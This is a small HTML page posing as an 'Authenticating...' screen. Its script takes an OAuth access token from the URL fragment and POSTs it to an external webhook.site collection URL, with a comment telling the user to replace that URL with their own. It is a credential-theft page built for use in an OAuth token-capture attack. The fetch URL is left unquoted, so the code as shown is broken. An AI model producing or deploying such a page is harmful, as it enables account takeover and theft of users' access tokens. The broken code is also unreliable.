<!DOCTYPE html>
<html>
<head><title>Authenticating...</title></head>
<body>
  <h3>Processing – please wait.</h3>
  <script>
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    const token = params.get('access_token');

    if (token) {
      fetch(https://webhook.site/232074eb-870d-4ba0-9d4a-4fc1d7b858b8, {  // <-- REPLACE with your webhook.site URL
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: token })
      }).then(() => {
        document.body.innerHTML = '<h3>Done – you can close this.</h3>';
      });
    } else {
      document.body.innerHTML = '<h3>Error – no token.</h3>';
    }
  </script>
</body>
</html>
